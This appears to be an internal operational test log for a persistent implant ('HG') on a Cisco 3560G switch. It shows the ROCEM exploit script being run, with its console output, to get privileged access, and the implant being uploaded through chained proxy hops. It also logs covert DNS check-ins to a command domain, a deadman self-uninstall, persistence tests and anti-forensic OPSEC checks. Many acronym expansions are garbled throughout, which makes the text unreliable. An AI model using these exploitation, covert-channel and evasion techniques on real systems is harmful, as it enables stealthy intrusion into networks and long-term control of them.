@@ -1,0 +1,479 @@
+
+                        Owner: User #71467
+HG v3.1.3-Adverse-01 Testing
+HG was delivered for JQJADVERSE on 9/8/15 for the Cisco 3560G.  Testing scope will include testing ROCEM v1.2 for ADVERSE, delivered to Test Range on 9/15/15, as well as testing HG Base functionality, DNSDomain Name System Checkin capability, SDCMicrosoft software packaging format comms, SMITE and on-device OPSEC since this will be a persistent delivery.  Also need to test failsafe uninstall to ensure if comms are not established that HG bugs out.
+CONOP will be
+
+Flux into network through three different hosts - first a webserver, then a DC, then to a host that is connected to an adjacent 2960 on a management subnet
+Trigger will be sent through flux, and CTCounter Terrorism session will be established back through flux initially
+An initial CTCounter Terrorism session will be established and DNSDomain Name System Checkin capability verified.  
+Subsequent comms with HG will be via DNSDomain Name System checkin.
+DNS Checkin has been preconfigured with capability to execute SMITE
+
+Testing Summary
+
+Found issue that appears to match EAREnterprise Archive 5012 - sent to Xetron to confirm this is the same issue.
+Observed EAREnterprise Archive 5163 - Known issue
+Observed EAREnterprise Archive 2036 - Known issue - Boot persistence not reported accurately in output of module show
+Validated EAREnterprise Archive 5078 - Fixed
+Be aware that checkin variance should be changed before delay if you are updating both values
+How long before trigger seq / time to checkin  are persisted?  Question for Xetron
+HG-7 - HG does not squelch ICMPInternet Control Message Protocol unreachable response to DNSCheckin query
+HG-8 - HG does not set DF bit
+HG-9 - HG does not detect HTTPSHypertext Transfer Protocol Secure clients to impersonate when https proxy uses port other than 443
+HG-10 - EAREnterprise Archive 5536 - HG does not make CTCounter Terrorism session to external IP
+
+Testing Notes
+Information about target:
+
+Hardware is WS-C3560G-24TS-S (DUT is WS-C3560G-24PS-E)
+Software is c3560-ipbase-mz.122-35.SE5
+BOOTLDR: C3560 Boot Loader (C3560-HBOOT-M) Version 12.2(25r)SEE4, RELEASE SOFTWARE (fc1)
+
+VMs Used
+
+Adverse-Flux1 - XX.XX.XXX.XX (IR-DATAK-20020718[IR])/192.168.0.21
+Adverse-Flux2/BIND - 192.168.0.11
+Adverse-Flux3 - 192.168.221.40
+Adverse-ICON-Debian8 - 172.20.12.34
+Adverse-Proxy - XX.XX.XXX.X (IR-DATAK-20020718[IR])/192.168.0.4
+Adverse-Seeds - 192.168.211.10
+DNS Server - X.X.X.X (LVLT-GOGL-8-8-8[US])
+
+DNS forwarding server 4.4.4.4
+
+ 
+
+Smoke Test of ROCEM
+Set up the Flux nodes to hop through Flux1 -> Flux2 -> Flux3.
+Added a route on ICON VMVirtual Machine for 192.168.0.0/24 to point to the Flux tunnel.
+Started ROCEM interactive session - successful:root@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -i 192.168.0.254[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c3560-ipbase-mz.122-35.SE5Host: 192.168.0.254Action: Interactive****************************************
+Proceed? (y/n)yTrying 127.0.0.1...[*] Attempting connection to host 192.168.0.254:23Connected to 127.0.0.1.Escape character is '^]'.[+] Connection established[*] Starting interactive session
+User Access Verification
+Password: MLS-Sth#
+ 
+MLS-Sth# show privCurrent privilege level is 15MLS-Sth#show users Line User Host(s) Idle Location* 1 vty 0 idle 00:00:00 192.168.221.40
+Interface User Mode Idle Peer Address
+MLS-Sth#exitConnection closed by foreign host.[+] Unsetting[*] Attempting connection to host 192.168.0.254:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Doneroot@debian:/home/user1/ops/adverse/adverse-1r/rocem#
+
+Set/Unset ROCEM - Successful
+
+oot@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -s 192.168.0.254[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c3560-ipbase-mz.122-35.SE5Host: 192.168.0.254Action: Set****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.0.254:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Doneroot@debian:/home/user1/ops/adverse/adverse-1r/rocem# telnet 192.168.0.254Trying 192.168.0.254...Connected to 192.168.0.254.Escape character is '^]'.
+MLS-Sth#exitConnection closed by foreign host.root@debian:/home/user1/ops/adverse/adverse-1r/rocem# ./rocem_c3560-ipbase-mz.122-35.SE5.py -u 192.168.0.254[+] Validating data/interactive.bin[+] Validating data/set.bin[+] Validating data/transfer.bin[+] Validating data/unset.bin
+****************************************Image: c3560-ipbase-mz.122-35.SE5Host: 192.168.0.254Action: Unset****************************************
+Proceed? (y/n)y[*] Attempting connection to host 192.168.0.254:23[+] Connection established[*] Sending Protocol Step 1[*] Sending Protocol Step 2[+] Doneroot@debian:/home/user1/ops/adverse/adverse-1r/rocem# telnet 192.168.0.254Trying 192.168.0.254...Connected to 192.168.0.254.Escape character is '^]'.
+User Access Verification
+Password: telnet> qConnection closed.root@debian:/home/user1/ops/adverse/adverse-1r/rocem
+
+
+
+
+Smoke test of HG install
+
+Setup Flux nodes
+Established Seeds traffic - on Seeds host, manually set proxy and then authenticated once manually.  Then kicked off ARP, DNSDomain Name System and HTTPSHypertext Transfer Protocol Secure seeds.
+Set ROCEM
+IAC attacked - rcvd acceptable error codes
+Uploaded HG - via 3 flux nodes, this takes a while even with interpacket delay set to 0
+Unset ROCEM
+Had to chmod 755 on adverse-1h.txt file - it was read only when I tried to edit even as root.  permissions were read and execute only.
+Established CTCounter Terrorism session through flux
+Verified DNSDomain Name System checkin is enabled - time to check in 2d 23h 29m 58s
+Verified DNSDomain Name System checkin commands available
+Disabled SDCMicrosoft software packaging format and changed dns checkin delay to 60s, dns checkin variance to 10s for testing purposes
+Verified that DNSDomain Name System checkin is successful[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 35s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 1m 0s  Variance 0d 0h 0m 10s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 957  Lifetime failure count 0  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************[checkin show]
+
+Enabled SDCMicrosoft software packaging format with 12 hour time frame, however DNSDomain Name System checkins did not work.  Attempted to web browse from Seeds host to give HG some traffic, however it still didn't work.
+Disabled SDCMicrosoft software packaging format again and DNSDomain Name System checkins did not resume
+Had to disable and then re-enable dns checkin to get dns checkins to resume
+Re-enabled SDC, then bounced dns checkin service.
+DNS checkin did not resume.  Will continue with SDCMicrosoft software packaging format testing later, disabling at this time
+Changed the cname to time on X.X.X.X (LVLT-GOGL-8-8-8[US]) and restarted bind service.
+Due to positive response caching on the Flux2 BINDDNS server software server, had to change the positive response cache ttl to 300s on that server and restart bind service
+At next DNSDomain Name System checkin, cname time was used and the commands were executed reset failsafe, change variance to 0, change sdc to 1 hour, and change delay to 25 hours.
+Changed cname back loc1 on X.X.X.X (LVLT-GOGL-8-8-8[US]).  Verified new caching settings are taking effect - after 300s, Flux2 BINDDNS server software sent the query to 4.4.4.4.
+Changed max-cache-ttl on 4.4.4.4 as well as flux2/BIND to 30s.  
+Changed cname to loc3 and restarted bind9 on X.X.X.X (LVLT-GOGL-8-8-8[US]).
+At next checkin, the new loc3 commands were executed:[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 15d 7h 40m 43s  Initial Delay 3d 0h 0m 0s  Delay 15d 0h 0m 0s  Variance 0d 12h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 12h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_map1_changedelay15d.cmd  Lifetime success count 994  Lifetime failure count 1  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 0h 1m 4s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************[checkin show]
+
+
+
+On-Device Opsec
+With persistent HG still installed, running successfully after a reboot, CTCounter Terrorism session established - collected show tech - 3560G-showtech-with-persisted-HG
+Used device uninstall-g -mp -f to uninstall HG - waited 4 minutes, collected show tech - 3560G-showtech-afterHGuninstall
+Reloaded 3560G - collected another show tech - 3560G-showtech-afer-reload
+Re-installed HG - collected a show tech without CTCounter Terrorism session, before any reload to verify persistence - 3560G-showtech-withHG
+Uninstalled via DNSDomain Name System checkin - observed anomalous output in show stacks.  Did not observe this after HG uninstall from CTCounter Terrorism session.
+Notes - Observed EAREnterprise Archive 5012 - LOTS of blank lines in show stack after HG uninstall via DNSDomain Name System checkin++++++
+Also observed Init process missing after HG install - this is known issue - EAREnterprise Archive 5163
+TCP Command process running - verified that this does show up at times without HG as well
+Need to verify sw forwarding counter in show controller output - EAREnterprise Archive 5078 - validated that this value is not incrementing with install of HG
+About 2M additional memory used while HG installed.
+
+
+Further checking into show stacks output - installed HG and allowing some DNSDomain Name System checkins to go through.  Will see if number of DNSDomain Name System checkins correlates to amount of blank likes in show stacks output.
+
+Allowed 23 DNSDomain Name System checkins to go through, then uninstalled via DNSDomain Name System checkin:Collected show tech - 3560G-showtech-afterHGuinstall-viaDNS
+
+
+Reloaded device, reinstalled HG, Allowed 23 DNSDomain Name System checkins to go through, then uninstalled via CTCounter Terrorism command
+Collected show tech - 3560G-showtech-afterHGuinstall-viaCT
+Noticed that blank lines are still present when uninstalled via CTCounter Terrorism - same number of blank lines as for previous test.
+
+
+
+Allow more DNSDomain Name System checkins to occur and see if the number of blank lines increases - number of blank lines is the sameAllowed 46 checkins, then uninstalled via CTCounter Terrorism - collected show tech 3560G-showtech-afterHGuinstall-viaCT-46
+
+
+Verifying show controllers output after HG install:
+Started with a clean device - it had been running all weekend - sw forwarding counter is 4
+Set ROCEM, IACInternational Access Code attacked, unset rocem - controllers counters still at 4
+Uploaded HG - 
+
+
+
+
+
+Tested Deaman failsafe where no hosts are available in snooped host list
+
+Installed HG and established CTCounter Terrorism session
+
+Changed DNSDomain Name System checkin settings to disable SDC, delay to be 20s, variance 10s.  
+Allowed DNSDomain Name System checkins to fail - no snooped hosts in DNSDomain Name System client list.
+
+When the 12th failure occured, HG uninstalled: [192.168.211.10]> checkin show[Success]
+ DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 3s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 0m 20s  Variance 0d 0h 0m 10s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed N/A  Lifetime success count 0  Lifetime failure count 11  Failsafe Max 12  Current Failsafe Count 11  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 0h 0m 17s
+ Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************[checkin show]
+ [192.168.211.10]> [Remote Failure] ************ Remote Failure ************Connection to device lost!!> >
+
+
+
+Ad hoc test - reload DUTDevice Under Test during HG install
+Set rocem, iac attacked, unset rocem
+Reloaded Dut during remote upload at 24%
+No alerting messages appeared on console, DUTDevice Under Test rebooted normally
+Subsequent attack and install successful
+
+
+Test HG persistence
+Installed HG via normal CONOP 
+Established a CTCounter Terrorism session with trigger seq set to 0.  Verified snooped dns client and server list - 192.168.211.10 and 192.168.0.11 respectively.
+Before 30 minutes had gone by, rebooted DUT
+Attempted to re-establsih CTCounter Terrorism session - trigger unsuccessful
+Reset beacon seq to 0 and then successfully re-established comms
+The time to next checkin for DNSDomain Name System check not persist - before reboot time to next checkin was 2d 23h 32m 9s  and after reboot it was 2d 23h 53m 6s.
+Rebooted after an hour and 15 minutes of uptime.... DNSDomain Name System checkin parameters had been changed.
+Checkin parameters remained changed - however the trigger seq went back to 0:[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 52s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 2m 0s  Variance 0d 0h 0m 10s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 12h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 16  Lifetime failure count 0  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************[checkin show]
+
+
+
+SDC test
+Established a CTCounter Terrorism session and changed delay to 60s and variance to 10s.  While CTCounter Terrorism session was active, checkin time arrived and expired.  I logged out from CTCounter Terrorism to see if it would snoop when CTCounter Terrorism session was not active and subsequesntly make a query via SDCMicrosoft software packaging format but it did not.
+Established CTCounter Terrorism session and changed dns checkin delay to 2m and variance to 10s.  Logged out from CTCounter Terrorism session and waited - after 2m I did rx a vesselwatcher query.
+Time between first DNSDomain Name System query and second query was about 3 minutes, however after that, they came in every two minutes:11:49:42.683220 IP 192.168.211.10.23165 > 192.168.0.11.domain: 7111+ A? www.vesselwatcher.net. (39)11:49:42.683967 IP 192.168.0.11.63256 > 4.4.4.4.domain: 24177+ [1au] A? www.vesselwatcher.net. (50)11:49:42.688779 IP 4.4.4.4.domain > 192.168.0.11.63256: 24177 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)11:49:42.689413 IP 192.168.0.11.60372 > 4.4.4.4.domain: 16280+ [1au] A? loc1.vesselwatcher.net. (51)11:49:42.690591 IP 192.168.0.11.domain > 192.168.211.10.23165: 7111 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)11:52:43.393058 IP 192.168.211.10.15926 > 192.168.0.11.domain: 40981+ A? www.vesselwatcher.net. (39)11:52:43.393700 IP 192.168.0.11.14071 > 4.4.4.4.domain: 60394+ [1au] A? www.vesselwatcher.net. (50)11:52:43.398762 IP 4.4.4.4.domain > 192.168.0.11.14071: 60394 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)11:52:43.399531 IP 192.168.0.11.18620 > 4.4.4.4.domain: 948+ [1au] A? loc1.vesselwatcher.net. (51)11:52:43.400846 IP 192.168.0.11.domain > 192.168.211.10.15926: 40981 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)11:54:48.874360 IP 192.168.211.10.20620 > 192.168.0.11.domain: 55646+ A? www.vesselwatcher.net. (39)11:54:48.875302 IP 192.168.0.11.47838 > 4.4.4.4.domain: 9865+ [1au] A? www.vesselwatcher.net. (50)11:54:48.879270 IP 4.4.4.4.domain > 192.168.0.11.47838: 9865 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)11:54:48.880038 IP 192.168.0.11.61522 > 4.4.4.4.domain: 48713+ [1au] A? loc1.vesselwatcher.net. (51)11:54:48.881292 IP 192.168.0.11.domain > 192.168.211.10.20620: 55646 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)11:56:59.349407 IP 192.168.211.10.16304 > 192.168.0.11.domain: 47923+ A? www.vesselwatcher.net. (39)11:56:59.350063 IP 192.168.0.11.9121 > 4.4.4.4.domain: 20606+ [1au] A? www.vesselwatcher.net. (50)11:56:59.354573 IP 4.4.4.4.domain > 192.168.0.11.9121: 20606 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)11:56:59.355361 IP 192.168.0.11.5131 > 4.4.4.4.domain: 18376+ [1au] A? loc1.vesselwatcher.net. (51)11:56:59.356677 IP 192.168.0.11.domain > 192.168.211.10.16304: 47923 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)
+
+Checked on Seeds traffic for any punch through DNSDomain Name System packets or replies - did not see anything come on wireshark during DNSDomain Name System checkin.  
+Disabled HTTPSHypertext Transfer Protocol Secure and ARPAddress Resolution Protocol seeds on on seeds host and allowed DNSDomain Name System seeds to continue - did not see the next checkin.  DNS seeds is not enough for SDCMicrosoft software packaging format apparently.
+Restarted HTTPSHypertext Transfer Protocol Secure and ARPAddress Resolution Protocol seeds - about 4 minutes later I did get a DNSDomain Name System checkin again:12:13:17.519037 IP 192.168.211.10.13372 > 192.168.0.11.domain: 31060+ A? www.vesselwatcher.net. (39)12:13:17.519933 IP 192.168.0.11.9343 > 4.4.4.4.domain: 57259+ [1au] A? www.vesselwatcher.net. (50)12:13:17.524538 IP 4.4.4.4.domain > 192.168.0.11.9343: 57259 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)12:13:17.525289 IP 192.168.0.11.57649 > 4.4.4.4.domain: 41926+ [1au] A? loc1.vesselwatcher.net. (51)12:13:17.526452 IP 192.168.0.11.domain > 192.168.211.10.13372: 31060 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)12:17:23.277763 IP 192.168.211.10.10608 > 192.168.0.11.domain: 41738+ A? www.vesselwatcher.net. (39)12:17:23.278454 IP 192.168.0.11.41021 > 4.4.4.4.domain: 23973+ [1au] A? www.vesselwatcher.net. (50)12:17:23.283150 IP 4.4.4.4.domain > 192.168.0.11.41021: 23973 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)12:17:23.283778 IP 192.168.0.11.6542 > 4.4.4.4.domain: 17025+ [1au] A? loc1.vesselwatcher.net. (51)12:17:23.284924 IP 192.168.0.11.domain > 192.168.211.10.10608: 41738 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)12:20:58.924137 IP 192.168.211.10.29641 > 192.168.0.11.domain: 30681+ A? www.vesselwatcher.net. (39)12:20:58.924853 IP 192.168.0.11.62419 > 4.4.4.4.domain: 34273+ [1au] A? www.vesselwatcher.net. (50)12:20:58.929699 IP 4.4.4.4.domain > 192.168.0.11.62419: 34273 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)12:20:58.930630 IP 192.168.0.11.10872 > 4.4.4.4.domain: 692+ [1au] A? loc1.vesselwatcher.net. (51)12:20:58.932027 IP 192.168.0.11.domain > 192.168.211.10.29641: 30681 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)12:24:24.585459 IP 192.168.211.10.13467 > 192.168.0.11.domain: 40913+ A? www.vesselwatcher.net. (39)12:24:24.586113 IP 192.168.0.11.29376 > 4.4.4.4.domain: 50225+ [1au] A? www.vesselwatcher.net. (50)12:24:24.591288 IP 4.4.4.4.domain > 192.168.0.11.29376: 50225 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)12:24:24.591859 IP 192.168.0.11.11661 > 4.4.4.4.domain: 63214+ [1au] A? loc1.vesselwatcher.net. (51)12:24:24.593216 IP 192.168.0.11.domain > 192.168.211.10.13467: 40913 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)12:27:55.346378 IP 192.168.211.10.29132 > 192.168.0.11.domain: 21644+ A? www.vesselwatcher.net. (39)12:27:55.347169 IP 192.168.0.11.3441 > 4.4.4.4.domain: 46765+ [1au] A? www.vesselwatcher.net. (50)12:27:55.351935 IP 4.4.4.4.domain > 192.168.0.11.3441: 46765 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)12:27:55.352804 IP 192.168.0.11.27175 > 4.4.4.4.domain: 34112+ [1au]
+
+
+ A? loc1.vesselwatcher.net. (51)12:27:55.354245 IP 192.168.0.11.domain > 192.168.211.10.29132: 21644 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)12:31:00.834970 IP 192.168.211.10.8719 > 192.168.0.11.domain: 51184+ A? www.vesselwatcher.net. (39)12:31:00.835853 IP 192.168.0.11.63238 > 4.4.4.4.domain: 17530+ [1au] A? www.vesselwatcher.net. (50)12:31:00.840680 IP 4.4.4.4.domain > 192.168.0.11.63238: 17530 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)12:31:00.841358 IP 192.168.0.11.43756 > 4.4.4.4.domain: 61869+ [1au] A? loc1.vesselwatcher.net. (51)12:31:00.842577 IP 192.168.0.11.domain > 192.168.211.10.8719: 51184 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)
+12:34:46.651969 IP 192.168.0.11.51319 > 4.4.4.4.domain: 63821+ [1au] A? www.vesselwatcher.net. (50)12:34:46.656434 IP 4.4.4.4.domain > 192.168.0.11.51319: 63821 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)12:34:46.657161 IP 192.168.0.11.30791 > 4.4.4.4.domain: 50251+ [1au] A? loc1.vesselwatcher.net. (51)12:34:46.658276 IP 192.168.0.11.domain > 192.168.211.10.19233: 1003 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)
+12:34:46.651231 IP 192.168.211.10.19233 > 192.168.0.11.domain: 1003+ A? www.vesselwatcher.net. (39)
+
+No failures have incremented:[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 1m 11s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 2m 0s  Variance 0d 0h 0m 10s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 12h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 12  Lifetime failure count 0  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0
+
+SDC comms are working, however it seems to take longer than just the checkin delay +/- variance to get checkins.  Extra time spent snooping - snooping is set to on for 60s, then off for 10s.  Snoop is set this way for dns, web and comms, and https.  
+
+
+Configured DNSDomain Name System server as Proxyy serverDNS checkins have resumed after the change16:45:16.872516 IP 192.168.211.10.26768 > 192.168.0.11.domain: 26686+ A? www.vesselwatcher.net. (39)16:45:16.873797 IP 192.168.0.11.63579 > 192.168.0.4.domain: 34834+ [1au] A? www.vesselwatcher.net. (50)16:45:16.882154 IP 192.168.0.4.domain > 192.168.0.11.63579: 34834 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)16:45:16.883501 IP 192.168.0.11.33273 > 192.168.0.4.domain: 17156+ [1au] A? loc1.vesselwatcher.net. (51)16:45:16.884533 IP 192.168.0.11.domain > 192.168.211.10.26768: 26686 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)16:51:28.204284 IP 192.168.211.10.21803 > 192.168.0.11.domain: 19945+ A? www.vesselwatcher.net. (39)16:51:28.204948 IP 192.168.0.11.50595 > 192.168.0.4.domain: 64097+ [1au] A? www.vesselwatcher.net. (50)16:51:28.211713 IP 192.168.0.4.domain > 192.168.0.11.50595: 64097 2/1/2 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (119)16:51:28.212386 IP 192.168.0.11.8652 > 192.168.0.4.domain: 38988+ [1au] A? loc1.vesselwatcher.net. (51)16:51:28.213306 IP 192.168.0.11.domain > 192.168.211.10.21803: 19945 2/1/1 CNAME loc1.vesselwatcher.net., A XX.X.X.X (FINET[US]) (108)
+
+
+
+Test failure case where DNSDomain Name System checkin does not get a response for its zone:
+
+Set checkin settings to delay 20s, variance 0s, sdc defaults
+Commented out the vesselwatcher.net zone
+Up to 8 failuresDnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled Yes  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 0s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 0m 20s  Variance 0d 0h 0m 0s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 12h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 34  Lifetime failure count 8  Failsafe Max 12  Current Failsafe Count 8  Deadman Enabled Yes  Last Error DNSDomain Name System Comms Failure (101)  Time Since Last Error 0d 0h 0m 36s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************[checkin show]
+
+HG uninstalled after 12 failures
+
+
+Ad-hoc test - reinstall HG after uninstall due to failsafe timeout
+Re-set ROCEM, IACInternational Access Code attack, unset ROCEM
+used remote to upload HG
+Established CTCounter Terrorism session successfully - no errors on login.  Normal IACInternational Access Code attack spike to 32% on CPU.
+
+
+Ad-hoc test - Rapid DNSDomain Name System checkin
+Installed HG and disabled SDC, set checkin delay to 20s and Variance to 1s
+Observed potential issue with changing these parameters - logged to file checkin-change-delay-issue
+Left running over night.  In the morning, successfully reconnected to HG over CTCounter Terrorism session and verified checkin:[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 6s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 0m 20s  Variance 0d 0h 0m 1s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 2759  Lifetime failure count 0  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************[checkin show]
+[192.168.211.10]>
+
+
+
+
+Test reload of HG modules
+
+From CTCounter Terrorism session, performed module show
+Restart DnsCheckin module[192.168.211.10]> module stop DnsCheckin
+[Success] ************ Success ************[module stop DnsCheckin]
+
+module no longer shows up in module show, tab tab does not show checkin command module
+Started module[192.168.211.10]> module start DNSCheckin.mod[Success] ************ Success ************[module start DNSCheckin.mod]
+
+DnsCheckin 5 No Running 0x2c509bc default:DnsCheckin.mod
+DnsCheckin ModuleRunning 5 No
+Restarted module - [192.168.211.10]> module restart DNSCheckin.mod[Success] ************ Success ************[module restart DNSCheckin.mod]
+[192.168.211.10]>
+
+Parameters were retained through module restart:[192.168.211.10]> checkin show[Success]
+DnsCheckin  Enabled Yes  SDCMicrosoft software packaging format Enabled No  Explicit Parameters Enabled No  Time to Next Check-In 0d 0h 0m 7s  Initial Delay 3d 0h 0m 0s  Delay 0d 0h 0m 20s  Variance 0d 0h 0m 1s  Domain www.vesselwatcher.net SDCMicrosoft software packaging format Time Interval 0d 0h 0m 0s  SDCMicrosoft software packaging format Max Existing Host Age 0d 0h 0m 0s  Last Command File Executed ci_loc1_resetfailsafe.cmd  Lifetime success count 2794  Lifetime failure count 0  Failsafe Max 12  Current Failsafe Count 0  Deadman Enabled Yes  Last Error None (0)  Time Since Last Error 0d 0h 0m 0s
+Explicit Parameters  IP 0.0.0.0  Subnet 0.0.0.0  MACApple Operating System 00:00:00:00:00:00  VLANVirtual Local Area Network 0  TTLTime To Live 0  Next Hop MACApple Operating System 00:00:00:00:00:00  Nameserver 0.0.0.0 ************ Success ************Press <enter> to continue[checkin show]
+
+Stopped and started FilterBroker module
+Restarted FilterBroker - takes longer than DNSCheckin but succeeds
+Attempted to stop module Socket - but got message that this is crticial:[192.168.211.10]> module stop Socket[Remote Failure] "Unload Module" command error:[Beachhead 112] Cannot unload critical************ Remote Failure ************[module stop Socket]
+[192.168.211.10]>
+
+Successfully stopped, started and then restarted ACEMod.mod
